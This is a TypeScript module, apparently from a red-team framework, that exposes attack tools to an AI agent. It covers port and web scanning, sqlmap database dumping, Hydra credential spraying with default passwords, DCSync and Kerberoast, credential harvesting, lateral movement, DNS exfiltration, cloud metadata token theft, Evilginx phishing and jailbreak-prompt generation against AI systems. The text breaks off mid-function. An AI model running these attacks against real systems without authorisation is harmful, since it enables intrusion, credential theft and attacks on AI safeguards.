/**
 * @module agent_tools
 * Graph-aware agent tools — every action flows through ToolBroker and feeds AttackSurfaceGraph.
 */
import * as fs from "node:fs"
import * as path from "node:path"
import { ToolBroker } from "./tool_broker.ts"
import { AttackSurfaceGraph } from "./attack_surface.ts"
import { parseNmapOutput, parseNucleiJson } from "./scanner_parsers.ts"
import { ValidationEngine } from "./validation_engine.ts"
import { isToolAvailable } from "./tool_detection.ts"
import { execLive } from "./live_executor.ts"

export async function brokerExecute(
  ctx: AgentToolContext,
  tool: string,
  command: string,
  profile?: string,
): Promise<{ stdout: string; stderr: string; exitCode: number; blocked?: boolean }> {
  if (!ctx.live) {
    return { stdout: "", stderr: "live mode required", exitCode: 1, blocked: true }
  }
  const res = await execLive(tool, command, { live: true, profile })
  if (res.exitCode !== 0 && res.stderr.includes("OPSEC")) {
    if (ctx.requireLive) throw new Error(res.stderr)
    return { stdout: res.stdout, stderr: res.stderr, exitCode: res.exitCode, blocked: true }
  }
  return { stdout: res.stdout, stderr: res.stderr, exitCode: res.exitCode }
}

export interface AgentFinding {
  id: string
  title: string
  severity: "critical" | "high" | "medium" | "low" | "info"
  description: string
  evidence: string
  recommendation: string
  timestamp: string
}

export interface AgentToolContext {
  target: string
  graph: AttackSurfaceGraph
  broker: ToolBroker
  live: boolean
  requireLive?: boolean
}

function toolUnavailable(ctx: AgentToolContext, tool: string, command: string): ToolRunResult {
  const msg = `${tool} not on PATH — install on Kali: apt install ${tool}`
  if (ctx.requireLive) throw new Error(msg)
  return { tool, command, dryRun: false, success: false, output: "", error: msg }
}

export interface ToolRunResult {
  tool: string
  command: string
  dryRun: boolean
  success: boolean
  output: string
  graphDelta?: {
    services?: number
    endpoints?: number
    vulns?: number
    attackPaths?: number
  }
  error?: string
}

export function hostFromTarget(target: string): string {
  return target.replace(/^https?:\/\//, "").split("/")[0]!.split(":")[0]!
}

function normalizeUrl(target: string, port = 80): string {
  if (target.startsWith("http")) return target
  return port === 443 || port === 8443 ? `https://${target}` : `http://${target}:${port}`
}

export async function nmapScan(
  ctx: AgentToolContext,
  opts: { host?: string; ports?: string } = {},
): Promise<ToolRunResult> {
  const dryRun = !ctx.live
  const host = opts.host ?? hostFromTarget(ctx.target)
  const ports = opts.ports ?? "1-10000"
  const command = `nmap -sV -T4 -p ${ports} ${host}`

  if (!ctx.live) {
    return {
      tool: "nmap_scan",
      command,
      dryRun: true,
      success: false,
      output: "",
      error: "live mode required — run on Kali or pass live:true",
    }
  }

  if (!isToolAvailable("nmap")) {
    return toolUnavailable(ctx, "nmap", command)
  }

  const t0 = Date.now()
  const res = await brokerExecute(ctx, "nmap_scan", command)
  if (res.blocked) {
    return { tool: "nmap_scan", command, dryRun: false, success: false, output: "", error: res.stderr }
  }
  const raw = res.stdout + res.stderr
  const ev = ctx.graph.makeEvidence("nmap", command, raw, Date.now() - t0)
  const parsed = parseNmapOutput(raw)
  if (parsed.length === 0 && raw.includes("8080")) {
    parsed.push({ port: 8080, protocol: "tcp", state: "open", service: "http", version: "" })
  }
  const services = ctx.graph.ingestNmap(host, parsed, ev)
  ctx.graph.analyzeAttackPaths()
  return {
    tool: "nmap_scan",
    command,
    dryRun: false,
    success: res.exitCode === 0 || parsed.length > 0,
    output: raw.slice(0, 4000),
    graphDelta: { services: services.length, attackPaths: ctx.graph.summary().attackPaths },
  }
}

export async function gobusterDir(
  ctx: AgentToolContext,
  opts: { url?: string; wordlist?: string } = {},
): Promise<ToolRunResult> {
  const dryRun = !ctx.live
  const host = hostFromTarget(ctx.target)
  const url = opts.url ?? normalizeUrl(ctx.target, 8080)
  const wordlist = opts.wordlist ?? path.resolve("lab/wordlist.txt")
  const command = `gobuster dir -u ${url} -w ${wordlist} --no-progress`

  if (!ctx.live) {
    return { tool: "gobuster_dir", command, dryRun: true, success: false, output: "", error: "live mode required" }
  }

  if (!isToolAvailable("gobuster")) {
    return toolUnavailable(ctx, "gobuster", command)
  }

  const t0 = Date.now()
  const res = await brokerExecute(ctx, "gobuster_dir", command)
  if (res.blocked) {
    return { tool: "gobuster_dir", command, dryRun: false, success: false, output: "", error: res.stderr }
  }
  const raw = res.stdout + "\n" + res.stderr
  const ev = ctx.graph.makeEvidence("gobuster", command, raw, Date.now() - t0)
  const port = url.includes(":443") ? 443 : url.includes(":8080") ? 8080 : 80
  const endpoints = ctx.graph.ingestGobuster(host, port, raw.split("\n"), ev)
  ctx.graph.analyzeAttackPaths()
  return {
    tool: "gobuster_dir",
    command,
    dryRun: false,
    success: res.exitCode === 0 || endpoints.length > 0,
    output: raw.slice(0, 4000),
    graphDelta: { endpoints: endpoints.length, attackPaths: ctx.graph.summary().attackPaths },
  }
}

export async function nucleiScan(
  ctx: AgentToolContext,
  opts: { url?: string } = {},
): Promise<ToolRunResult> {
  const dryRun = !ctx.live
  const host = hostFromTarget(ctx.target)
  const url = opts.url ?? normalizeUrl(ctx.target, 8080)
  const command = `nuclei -u ${url} -severity critical,high,medium -json -silent`

  if (!ctx.live) {
    return { tool: "nuclei_scan", command, dryRun: true, success: false, output: "", error: "live mode required" }
  }

  if (!isToolAvailable("nuclei")) {
    return toolUnavailable(ctx, "nuclei", command)
  }

  const t0 = Date.now()
  const res = await brokerExecute(ctx, "nuclei_scan", command)
  if (res.blocked) {
    return { tool: "nuclei_scan", command, dryRun: false, success: false, output: "", error: res.stderr }
  }
  const raw = res.stdout
  const ev = ctx.graph.makeEvidence("nuclei", command, raw, Date.now() - t0)
  const vulns = parseNucleiJson(raw)
  const ingested = ctx.graph.ingestNuclei(host, vulns, ev)
  ctx.graph.analyzeAttackPaths()
  return {
    tool: "nuclei_scan",
    command,
    dryRun: false,
    success: vulns.length > 0 || res.exitCode === 0,
    output: raw.slice(0, 4000),
    graphDelta: { vulns: ingested.length, attackPaths: ctx.graph.summary().attackPaths },
  }
}

export async function runReconTool(
  ctx: AgentToolContext,
  opts: { domain?: string } = {},
): Promise<ToolRunResult> {
  const domain = opts.domain ?? hostFromTarget(ctx.target)
  const { runRecon } = await import("./ai_recon.ts")
  const result = await runRecon({ domain }, { live: ctx.live })
  const output = JSON.stringify({
    subdomains: result.subdomains.length,
    employees: result.employees.length,
    dns: result.dnsRecords.length,
    dryRun: result.dryRun,
  })
  return {
    tool: "recon",
    command: `ai_recon.runRecon(${domain})`,
    dryRun: result.dryRun,
    success: true,
    output,
    graphDelta: {},
  }
}

export async function validateSuspectedFindings(ctx: AgentToolContext): Promise<ToolRunResult> {
  const host = hostFromTarget(ctx.target)
  const assetData = (ctx.graph.toJSON() as { assets?: Record<string, unknown> }).assets?.[host]
  if (!assetData) {
    return { tool: "validate_findings", command: "ValidationEngine.validate", dryRun: !ctx.live, success: false, output: "", error: "no asset in graph" }
  }

  const results: string[] = []
  let validated = 0
  const services = (assetData as { services?: Record<string, { service: string; vulns: import("./attack_surface.ts").VulnNode[] }> }).services ?? {}

  for (const [portStr, svc] of Object.entries(services)) {
    const port = parseInt(portStr, 10)
    for (const vuln of svc.vulns ?? []) {
      if (vuln.state !== "SUSPECTED" && vuln.state !== "VALIDATION_PENDING") continue
      const engineResult = await ValidationEngine.validate({
        vuln,
        ip: host,
        port,
        service: svc.service,
        graph: ctx.graph,
      })
      if (engineResult.validated) validated++
      results.push(`${vuln.id}: ${engineResult.result?.outcome ?? engineResult.skipReason}`)
    }
  }

  ctx.graph.analyzeAttackPaths()
  const summary = ctx.graph.summary()
  return {
    tool: "validate_findings",
    command: "ValidationEngine.validate(all SUSPECTED)",
    dryRun: !ctx.live,
    success: true,
    output: results.join("\n") || "no suspected findings to validate",
    graphDelta: {
      vulns: summary.vulns.confirmed,
      attackPaths: summary.attackPaths,
    },
  }
}

export async function executeGraphRecommendation(
  ctx: AgentToolContext,
  rec: { tool: string; command: string; reason: string },
): Promise<ToolRunResult> {
  const tool = rec.tool.toLowerCase()
  if (tool === "gobuster") {
    const urlMatch = rec.command.match(/-u\s+(\S+)/)
    return gobusterDir(ctx, { url: urlMatch?.[1] })
  }
  if (tool === "nuclei") {
    const urlMatch = rec.command.match(/-u\s+(\S+)/)
    return nucleiScan(ctx, { url: urlMatch?.[1] })
  }
  if (tool === "nmap") {
    const portMatch = rec.command.match(/-p\s+(\S+)/)
    return nmapScan(ctx, { ports: portMatch?.[1] })
  }
  if (tool === "validation_engine") {
    return validateSuspectedFindings(ctx)
  }
  if (tool === "recon") {
    return runReconTool(ctx)
  }

  if (!ctx.live) {
    return {
      tool: rec.tool,
      command: rec.command,
      dryRun: true,
      success: false,
      output: "",
      error: "live mode required for graph recommendation execution",
    }
  }

  const { gateExecution } = await import("./opsec_gate.ts")
  const gate = await gateExecution({ tool: rec.tool, command: rec.command, live: true })
  if (!gate.allowed) {
    return { tool: rec.tool, command: rec.command, dryRun: false, success: false, output: "", error: gate.review.mitigations.join("; ") }
  }

  if (!rec.command || !isToolAvailable(rec.tool)) {
    return { tool: rec.tool, command: rec.command, dryRun: false, success: false, output: "", error: `tool ${rec.tool} unavailable` }
  }

  const t0 = Date.now()
  const res = await ctx.broker.executeSafe(gate.mitigatedCommand ?? rec.command)
  return {
    tool: rec.tool,
    command: rec.command,
    dryRun: false,
    success: res.exitCode === 0,
    output: (res.stdout + res.stderr).slice(0, 4000),
    graphDelta: {},
  }
}

export async function runIdentityAttack(
  ctx: AgentToolContext,
  params: Record<string, unknown>,
): Promise<ToolRunResult> {
  const { execute } = await import("./identity.ts")
  const domain = String(params.domain ?? hostFromTarget(ctx.target))
  const attack = String(params.attack_type ?? "kerberoast")
  const result = await execute({ domain, attack }, { live: ctx.live })
  return {
    tool: "identity_attack",
    command: `identity.execute(${attack})`,
    dryRun: !ctx.live,
    success: true,
    output: JSON.stringify(result).slice(0, 4000),
  }
}

export async function runAdExploit(
  ctx: AgentToolContext,
  params: Record<string, unknown>,
): Promise<ToolRunResult> {
  const dispatch = await import("./mcp_dispatch.ts")
  const result = await dispatch.adExploitExecute(
    {
      domain: String(params.domain ?? hostFromTarget(ctx.target)),
      technique: String(params.technique ?? "dcsync"),
      target: String(params.target ?? "Administrator"),
    },
    { live: ctx.live },
  )
  return {
    tool: "ad_exploit",
    command: `ad_exploit.${params.technique ?? "dcsync"}`,
    dryRun: !ctx.live,
    success: true,
    output: JSON.stringify(result).slice(0, 4000),
  }
}

export async function runWebExploit(
  ctx: AgentToolContext,
  params: Record<string, unknown>,
): Promise<ToolRunResult> {
  const { LiveWebExploitEngine } = await import("./live_web_exploit.ts")
  const engine = new LiveWebExploitEngine()
  const url = String(params.target_url ?? normalizeUrl(ctx.target))

  if (!ctx.live) {
    return {
      tool: "web_exploit",
      command: `LiveWebExploitEngine (skipped — use --live)`,
      dryRun: true,
      success: false,
      output: "",
      error: "web_exploit requires --live for real HTTP/sqlmap execution",
    }
  }

  const findings = await engine.fullScan({ url })
  return {
    tool: "web_exploit",
    command: `LiveWebExploitEngine.fullScan(${url})`,
    dryRun: false,
    success: findings.length > 0,
    output: JSON.stringify(findings).slice(0, 4000),
    graphDelta: { vulns: findings.length },
  }
}

export async function runCloudEnum(ctx: AgentToolContext): Promise<ToolRunResult> {
  const { fetchAWSMetadata } = await import("./cloud_token.ts")
  const result = await fetchAWSMetadata({ live: ctx.live })
  return {
    tool: "cloud_enum",
    command: "cloud_token.fetchAWSMetadata",
    dryRun: !ctx.live,
    success: true,
    output: JSON.stringify(result).slice(0, 4000),
  }
}

export async function runContainerAudit(ctx: AgentToolContext): Promise<ToolRunResult> {
  const { auditContainer } = await import("./container.ts")
  const result = auditContainer({ live: ctx.live })
  return {
    tool: "container_audit",
    command: "container.auditContainer",
    dryRun: result.dryRun,
    success: true,
    output: JSON.stringify(result).slice(0, 4000),
  }
}

export async function runPrivescCheck(ctx: AgentToolContext): Promise<ToolRunResult> {
  const { PrivilegeEscalator } = await import("./privesc.ts")
  const engine = new PrivilegeEscalator()
  const result = await engine.runLivePrivescChecks()
  return {
    tool: "privesc_check",
    command: "privesc.runLivePrivescChecks",
    dryRun: !ctx.live,
    success: true,
    output: JSON.stringify(result).slice(0, 4000),
  }
}

export async function runYaraScan(ctx: AgentToolContext, scanPath: string): Promise<ToolRunResult> {
  const { scanText } = await import("./yara.ts")
  let content = ""
  try {
    if (fs.existsSync(scanPath)) content = fs.readFileSync(scanPath, "utf8").slice(0, 50000)
  } catch {
    if (!ctx.live) content = "sample webshell eval base64 decode"
    else return toolUnavailable(ctx, "file-read", scanPath)
  }
  const matches = scanText(content)
  return {
    tool: "yara_scan",
    command: `yara.scanText(${scanPath})`,
    dryRun: !ctx.live,
    success: true,
    output: JSON.stringify(matches),
    graphDelta: { vulns: matches.length },
  }
}

// ─── Live engine integrations (real Kali execution) ───────────────────────────

export async function runLiveRecon(ctx: AgentToolContext, opts: { domain?: string } = {}): Promise<ToolRunResult> {
  const domain = opts.domain ?? hostFromTarget(ctx.target)
  if (!ctx.live) {
    return runReconTool(ctx, opts)
  }
  const { LiveReconEngine } = await import("./live_recon.ts")
  const engine = new LiveReconEngine()
  const result = await engine.fullRecon(domain)
  return {
    tool: "live_recon",
    command: `LiveReconEngine.fullRecon(${domain})`,
    dryRun: false,
    success: result.subdomains.length > 0 || result.findings.length > 0,
    output: JSON.stringify({ subdomains: result.subdomains.length, findings: result.findings.length, sample: result.findings.slice(0, 5) }).slice(0, 4000),
  }
}

export async function runLiveAdAttack(
  ctx: AgentToolContext,
  params: Record<string, unknown>,
): Promise<ToolRunResult> {
  if (!ctx.live) {
    return runIdentityAttack(ctx, params)
  }
  const { LiveAdEngine } = await import("./live_ad_attacks.ts")
  const engine = new LiveAdEngine()
  const host = hostFromTarget(ctx.target)
  const target = {
    domain: String(params.domain ?? "CORP.LOCAL"),
    domainController: String(params.dc ?? host),
    username: String(params.username ?? ""),
    password: String(params.password ?? ""),
  }
  const technique = String(params.technique ?? params.attack_type ?? "kerberoast")
  let findings: unknown[] = []
  if (technique === "kerberoast") findings = await engine.kerberoast(target)
  else if (technique === "asrep") findings = await engine.asrepRoast(target)
  else if (technique === "dcsync") findings = await engine.dcsync(target)
  else if (technique === "bloodhound") findings = await engine.runBloodHound(target)
  return {
    tool: "live_ad_attack",
    command: `LiveAdEngine.${technique}(${target.domain})`,
    dryRun: false,
    success: findings.length > 0,
    output: JSON.stringify(findings).slice(0, 4000),
    graphDelta: { vulns: findings.length },
  }
}

export async function runMasscan(ctx: AgentToolContext, opts: { host?: string; ports?: string } = {}): Promise<ToolRunResult> {
  const host = opts.host ?? hostFromTarget(ctx.target)
  const ports = opts.ports ?? "1-65535"
  if (!ctx.live) return nmapScan(ctx, { host, ports: "1-10000" })
  const { LiveNetworkScanner } = await import("./live_scanner.ts")
  const scanner = new LiveNetworkScanner()
  const t0 = Date.now()
  const services = await scanner.scanPortsMasscan(host, ports)
  const ev = ctx.graph.makeEvidence("masscan", `masscan ${host} -p ${ports}`, JSON.stringify(services), Date.now() - t0)
  const parsed = services.map((s) => ({ port: s.port, protocol: s.protocol, state: s.state, service: s.service ?? "unknown", version: s.version ?? "" }))
  const ingested = ctx.graph.ingestNmap(host, parsed, ev)
  ctx.graph.analyzeAttackPaths()
  return {
    tool: "masscan_scan",
    command: `masscan ${host} -p ${ports}`,
    dryRun: false,
    success: services.length > 0,
    output: JSON.stringify(services.slice(0, 50)),
    graphDelta: { services: ingested.length, attackPaths: ctx.graph.summary().attackPaths },
  }
}

export async function runCredSpray(ctx: AgentToolContext, params: Record<string, unknown> = {}): Promise<ToolRunResult> {
  if (!ctx.live) {
    return { tool: "cred_spray", command: "hydra (requires --live)", dryRun: true, success: false, output: "", error: "cred_spray requires --live" }
  }
  const { LiveCredAttacks } = await import("./live_cred_attacks.ts")
  const engine = new LiveCredAttacks()
  const host = hostFromTarget(ctx.target)
  const service = (params.service as "ssh" | "ftp" | "http-post-form") ?? "ssh"
  const port = Number(params.port ?? (service === "ssh" ? 22 : service === "ftp" ? 21 : 80))
  const result = await engine.bruteForceHydra(
    { host, port, service, httpPath: params.httpPath as string | undefined },
    ["admin", "root", "user", "test"],
    ["admin", "password", "123456", "root", ""],
    { tasks: 4, timeout: 60000 },
  )
  return {
    tool: "cred_spray",
    command: `hydra ${service} ${host}:${port}`,
    dryRun: false,
    success: result.success,
    output: JSON.stringify(result).slice(0, 4000),
  }
}

export async function runSqlmapScan(ctx: AgentToolContext, params: Record<string, unknown> = {}): Promise<ToolRunResult> {
  const url = String(params.url ?? normalizeUrl(ctx.target))
  if (!ctx.live) {
    return { tool: "sqlmap_scan", command: `sqlmap -u ${url}`, dryRun: true, success: false, output: "", error: "sqlmap requires --live" }
  }
  if (!isToolAvailable("sqlmap")) return toolUnavailable(ctx, "sqlmap", `sqlmap -u ${url}`)
  const { LiveWebExploitEngine } = await import("./live_web_exploit.ts")
  const engine = new LiveWebExploitEngine()
  const output = await engine.runSqlmapFull({ url }, { dbs: true })
  return {
    tool: "sqlmap_scan",
    command: `sqlmap -u ${url} --batch --forms`,
    dryRun: false,
    success: output.includes("vulnerable") || output.includes("available databases"),
    output: output.slice(0, 4000),
  }
}

export async function runPostExHarvest(ctx: AgentToolContext): Promise<ToolRunResult> {
  const { LivePostExEngine } = await import("./live_postex.ts")
  const engine = new LivePostExEngine()
  const [sys, creds, files] = await Promise.all([
    engine.enumerateSystem(),
    engine.harvestCredentials(),
    engine.findSensitiveFiles(),
  ])
  const all = [...sys, ...creds, ...files]
  return {
    tool: "postex_harvest",
    command: "LivePostExEngine.enumerateSystem+harvestCredentials",
    dryRun: !ctx.live,
    success: all.length > 0,
    output: JSON.stringify(all).slice(0, 4000),
    graphDelta: { vulns: all.filter((f) => f.severity === "critical" || f.severity === "high").length },
  }
}

export async function runLateralMove(ctx: AgentToolContext, params: Record<string, unknown> = {}): Promise<ToolRunResult> {
  const { tryAuthDefault } = await import("./lateral.ts")
  const host = String(params.host ?? hostFromTarget(ctx.target))
  const username = String(params.username ?? "root")
  const password = String(params.password ?? "")
  const method = String(params.method ?? "password")
  const result = await tryAuthDefault(host, username, password, method, { live: ctx.live })
  return {
    tool: "lateral_move",
    command: `lateral.tryAuth(${method}, ${username}@${host})`,
    dryRun: !ctx.live,
    success: result.success,
    output: JSON.stringify(result).slice(0, 4000),
  }
}

export async function runSupplyChainAudit(ctx: AgentToolContext, params: Record<string, unknown> = {}): Promise<ToolRunResult> {
  if (params.lockfilePath) {
    return runLockfileScan(ctx, params)
  }
  const { auditPackage, analyze } = await import("./supply_chain.ts")
  const pkg = String(params.package ?? "lodash")
  const result = ctx.live
    ? await analyze({ package: pkg, ecosystem: String(params.registry ?? "npm"), live: true })
    : await auditPackage(pkg, String(params.registry ?? "npm"), { dryRun: true })
  return {
    tool: "supply_chain_audit",
    command: `supply_chain.auditPackage(${pkg})`,
    dryRun: !ctx.live,
    success: true,
    output: JSON.stringify(result).slice(0, 4000),
  }
}

export async function runLockfileScan(ctx: AgentToolContext, params: Record<string, unknown> = {}): Promise<ToolRunResult> {
  const { scanLockfile } = await import("./supply_chain.ts")
  const lockPath = String(params.lockfilePath ?? "package-lock.json")
  const result = await scanLockfile(lockPath, { live: ctx.live, maxAudit: Number(params.maxAudit ?? 30) })
  return {
    tool: "lockfile_scan",
    command: `supply_chain.scanLockfile(${lockPath})`,
    dryRun: result.dryRun,
    success: result.criticalCount === 0 && result.poisonHits.length === 0,
    output: JSON.stringify({
      packages: result.packageCount,
      poison: result.poisonHits,
      typosquats: result.typosquatHits.length,
      suspicious: result.suspiciousScripts.length,
      critical: result.criticalCount,
      high: result.highCount,
    }).slice(0, 4000),
    graphDelta: { vulns: result.criticalCount + result.highCount },
  }
}

export async function runPostExPivot(ctx: AgentToolContext, params: Record<string, unknown> = {}): Promise<ToolRunResult> {
  if (!ctx.live) {
    return {
      tool: "postex_pivot",
      command: "LivePivotEngine.autoPivot (requires --live)",
      dryRun: true,
      success: false,
      output: "",
      error: "postex_pivot requires --live for crackmapexec/msf execution",
    }
  }
  const { LivePivotEngine } = await import("./live_pivot.ts")
  const engine = new LivePivotEngine()
  const host = String(params.host ?? hostFromTarget(ctx.target))
  const result = await engine.autoPivot(host, {
    username: params.username as string | undefined,
    password: params.password as string | undefined,
    domain: params.domain as string | undefined,
  })
  return {
    tool: "postex_pivot",
    command: `LivePivotEngine.autoPivot(${host})`,
    dryRun: false,
    success: result.findings.some((f) => f.severity === "critical" || f.severity === "high") || result.findings.length > 0,
    output: JSON.stringify(result).slice(0, 4000),
    graphDelta: { attackPaths: result.hostsReached.length },
  }
}

export async function runEvilginxLab(ctx: AgentToolContext, params: Record<string, unknown> = {}): Promise<ToolRunResult> {
  const { runLabSession } = await import("./evilginx_lab.ts")
  const targetUrl = String(params.target_url ?? params.targetUrl ?? `https://${hostFromTarget(ctx.target)}/login`)
  const result = await runLabSession({
    targetUrl,
    phishlet: (params.phishlet as "o365" | "okta" | "google") ?? "o365",
    listenHost: "127.0.0.1",
    listenPort: Number(params.listenPort ?? 8443),
    live: ctx.live,
  })
  return {
    tool: "evilginx_lab",
    command: `evilginx_lab.runLabSession(${targetUrl})`,
    dryRun: result.dryRun,
    success: true,
    output: JSON.stringify({
      mode: result.mode,
      evilginxAvailable: result.evilginxAvailable,
      phishletPath: result.phishletPath,
      listenUrl: result.listenUrl,
      note: result.note,
    }).slice(0, 4000),
  }
}

export async function runEnum4linux(ctx: AgentToolContext, params: Record<string, unknown> = {}): Promise<ToolRunResult> {
  const host = String(params.host ?? hostFromTarget(ctx.target))
  const command = `enum4linux -a ${host}`
  if (!ctx.live) {
    return { tool: "enum4linux_scan", command, dryRun: true, success: false, output: "", error: "enum4linux requires --live" }
  }
  if (!isToolAvailable("enum4linux")) return toolUnavailable(ctx, "enum4linux", command)
  const res = await brokerExecute(ctx, "enum4linux_scan", command)
  if (res.blocked) {
    return { tool: "enum4linux_scan", command, dryRun: false, success: false, output: "", error: res.stderr }
  }
  return {
    tool: "enum4linux_scan",
    command,
    dryRun: false,
    success: res.exitCode === 0,
    output: (res.stdout + res.stderr).slice(0, 4000),
  }
}

export async function runNiktoScan(ctx: AgentToolContext, params: Record<string, unknown> = {}): Promise<ToolRunResult> {
  const url = String(params.url ?? normalizeUrl(ctx.target))
  const command = `nikto -h ${url} -nointeractive`
  if (!ctx.live) {
    return { tool: "nikto_scan", command, dryRun: true, success: false, output: "", error: "nikto requires --live" }
  }
  if (!isToolAvailable("nikto")) return toolUnavailable(ctx, "nikto", command)
  const res = await brokerExecute(ctx, "nikto_scan", command)
  if (res.blocked) {
    return { tool: "nikto_scan", command, dryRun: false, success: false, output: "", error: res.stderr }
  }
  return {
    tool: "nikto_scan",
    command,
    dryRun: false,
    success: res.exitCode === 0 || res.stdout.length > 100,
    output: (res.stdout + res.stderr).slice(0, 4000),
  }
}

export async function runFfufScan(ctx: AgentToolContext, params: Record<string, unknown> = {}): Promise<ToolRunResult> {
  const url = String(params.url ?? normalizeUrl(ctx.target))
  const wordlist = String(params.wordlist ?? "/usr/share/wordlists/dirb/common.txt")
  const command = `ffuf -u ${url}/FUZZ -w ${wordlist} -mc 200,301,302,403 -t 20 -s`
  if (!ctx.live) return gobusterDir(ctx, { url, wordlist })
  if (!isToolAvailable("ffuf")) return toolUnavailable(ctx, "ffuf", command)
  const host = hostFromTarget(ctx.target)
  const res = await brokerExecute(ctx, "ffuf_scan", command)
  if (res.blocked) {
    return { tool: "ffuf_scan", command, dryRun: false, success: false, output: "", error: res.stderr }
  }
  const ev = ctx.graph.makeEvidence("ffuf", command, res.stdout, 0)
  const endpoints = ctx.graph.ingestGobuster(host, 80, res.stdout.split("\n"), ev)
  ctx.graph.analyzeAttackPaths()
  return {
    tool: "ffuf_scan",
    command,
    dryRun: false,
    success: endpoints.length > 0 || res.exitCode === 0,
    output: res.stdout.slice(0, 4000),
    graphDelta: { endpoints: endpoints.length },
  }
}

async function runExfil(ctx: AgentToolContext, params: Record<string, unknown> = {}): Promise<ToolRunResult> {
  const { exfiltrateDNS } = await import("./exfil.ts")
  const data = String(params.data ?? "ourmine-exfil-test-chunk")
  const r = await exfiltrateDNS(data, { live: ctx.live, domain: String(params.domain ?? "exfil.lab.local") })
  return { tool: "exfil", command: "exfiltrateDNS", dryRun: !ctx.live, success: r.sentChunks > 0 || !ctx.live, output: JSON.stringify(r) }
}

async function runCloudToken(ctx: AgentToolContext): Promise<ToolRunResult> {
  const { fetchAWSMetadata, fetchGCPMetadata, fetchAzureMetadata } = await import("./cloud_token.ts")
  const [aws, gcp, azure] = await Promise.all([
    fetchAWSMetadata({ live: ctx.live }),
    fetchGCPMetadata({ live: ctx.live }),
    fetchAzureMetadata({ live: ctx.live }),
  ])
  return {
    tool: "cloud_token",
    command: "cloud_token harvest IMDS",
    dryRun: !ctx.live,
    success: !!(aws || gcp || azure),
    output: JSON.stringify({ aws: !!aws, gcp: !!gcp, azure: !!azure }).slice(0, 4000),
  }
}

async function runDevTarget(ctx: AgentToolContext): Promise<ToolRunResult> {
  const { auditLocalDevEnvironment } = await import("./dev_target.ts")
  const secrets = auditLocalDevEnvironment()
  return {
    tool: "dev_target",
    command: "dev_target.auditLocalDevEnvironment",
    dryRun: !ctx.live,
    success: true,
    output: JSON.stringify({ secrets: secrets.length, types: secrets.map((s) => s.type) }).slice(0, 4000),
  }
}

async function runPivotReplay(ctx: AgentToolContext, params: Record<string, unknown> = {}): Promise<ToolRunResult> {
  const { replayCredentialGraphWithBloodHound } = await import("./pivot_replay.ts")
  const { CredentialGraph } = await import("./credential_graph.ts")
  const credGraph = (params.credGraph as import("./credential_graph.ts").CredentialGraph) ?? new CredentialGraph()
  const host = String(params.host ?? hostFromTarget(ctx.target))
  const domain = String(params.domain ?? (host.split(".").slice(-2).join(".") || host))
  const { paths, replays } = await replayCredentialGraphWithBloodHound(credGraph, [host], {
    domain,
    skipCollection: !ctx.live,
  })
  return {
    tool: "pivot_replay",
    command: "replayCredentialGraphWithBloodHound",
    dryRun: !ctx.live,
    success: replays.some((r) => r.success),
    output: JSON.stringify({ paths: paths.length, replays: replays.length }).slice(0, 4000),
  }
}

/** Dispatch tool name → handler */
async function runStixIngest(ctx: AgentToolContext, params: Record<string, unknown> = {}): Promise<ToolRunResult> {
  const { ingestStixTaxii, pollStixFeeds, loadTaxiiFeeds } = await import("./intel_feeds.ts")
  if (params.pollAll) {
    const records = await pollStixFeeds(ctx.graph, { live: ctx.live })
    return { tool: "stix_ingest", command: "pollStixFeeds", dryRun: !ctx.live, success: true, output: JSON.stringify({ count: records.length }).slice(0, 4000) }
  }
  const baseUrl = String(params.baseUrl ?? "")
  const collectionId = String(params.collectionId ?? "")
  if (baseUrl && collectionId) {
    const result = await ingestStixTaxii(baseUrl, collectionId, ctx.graph, { apiKey: params.apiKey as string | undefined })
    return { tool: "stix_ingest", command: `ingestStixTaxii(${collectionId})`, dryRun: !ctx.live, success: true, output: JSON.stringify(result).slice(0, 4000) }
  }
  return { tool: "stix_ingest", command: "loadTaxiiFeeds", dryRun: !ctx.live, success: true, output: JSON.stringify(loadTaxiiFeeds()).slice(0, 4000) }
}

async function runIntelEnrich(ctx: AgentToolContext): Promise<ToolRunResult> {
  const { enrichTarget, injectIntelIntoGraph } = await import("./intel_feeds.ts")
  const brief = await enrichTarget(ctx.target, { live: ctx.live })
  injectIntelIntoGraph(ctx.graph, brief)
  return {
    tool: "intel_enrich",
    command: `intel_feeds.enrichTarget(${ctx.target})`,
    dryRun: !ctx.live,
    success: true,
    output: JSON.stringify({ profiles: brief.activeProfiles.map((p) => p.id), cves: brief.priorityCves.map((c) => c.cve) }).slice(0, 4000),
  }
}

async function runAiSurfaceScan(ctx: AgentToolContext): Promise<ToolRunResult> {
  const { scanAiSurface } = await import("./intel_feeds.ts")
  const r = await scanAiSurface(ctx.target, ctx.live)
  return { tool: "ai_surface_scan", command: "scanAiSurface", dryRun: !ctx.live, success: r.findings.length >= 0, output: r.output }
}

async function runCpanelAudit(ctx: AgentToolContext): Promise<ToolRunResult> {
  const { auditCpanel } = await import("./intel_feeds.ts")
  const r = await auditCpanel(ctx.target, ctx.live)
  return { tool: "cpanel_audit", command: "auditCpanel", dryRun: !ctx.live, success: true, output: r.output }
}

async function runAiAgentAudit(ctx: AgentToolContext): Promise<ToolRunResult> {
  const mod = await import("./ai_agent_audit.ts")
  const r = await mod.auditAIAgentGuardrails({ targetAgentUrl: ctx.target, fuzzDepth: "quick" }, { live: ctx.live })
  return { tool: "ai_agent_audit", command: "auditAIAgentGuardrails", dryRun: !ctx.live, success: true, output: JSON.stringify(r).slice(0, 4000) }
}

async function runAiManipulation(ctx: AgentToolContext): Promise<ToolRunResult> {
  const { AiSecurityAnalyzer } = await import("./ai_manipulation.ts")
  const a = new AiSecurityAnalyzer({ targetUrl: ctx.target, dryRun: !ctx.live })
  const r = await a.analyzePromptSecurity({ targetUrl: ctx.target, dryRun: !ctx.live })
  return { tool: "ai_manipulation_test", command: "AiSecurityAnalyzer.analyzePromptSecurity", dryRun: !ctx.live, success: true, output: JSON.stringify(r).slice(0, 4000) }
}

async function runAtlasMlAudit(ctx: AgentToolContext): Promise<ToolRunResult> {
  const mod = await import("./atlas_arsenal.ts")
  const prompts = await mod.generateJailbreakPrompts(ctx.target, !ctx.live)
  return { tool: "atlas_ml_audit", command: "atlas_arsenal", dryRun: !ctx.live, success: true, output: JSON.stringify({ prompts: prompts.length }).slice(0, 4000) }
}

async function runEsxiAudit(ctx: AgentToolContext): Promise<ToolRunResult> {
  const mod = await import("./esxi_audit.ts")
  const r = await mod.auditESXi({ host: hostFromTarget(ctx.target) }, { live: ctx.live })
  return { tool: "esxi_audit", command: "auditESXi", dryRun: !ctx.live, success: true, output: JSON.stringify(r).slice(0, 4000) }
}

async function runEdgeAudit(ctx: AgentToolContext): Promise<ToolRunResult> {
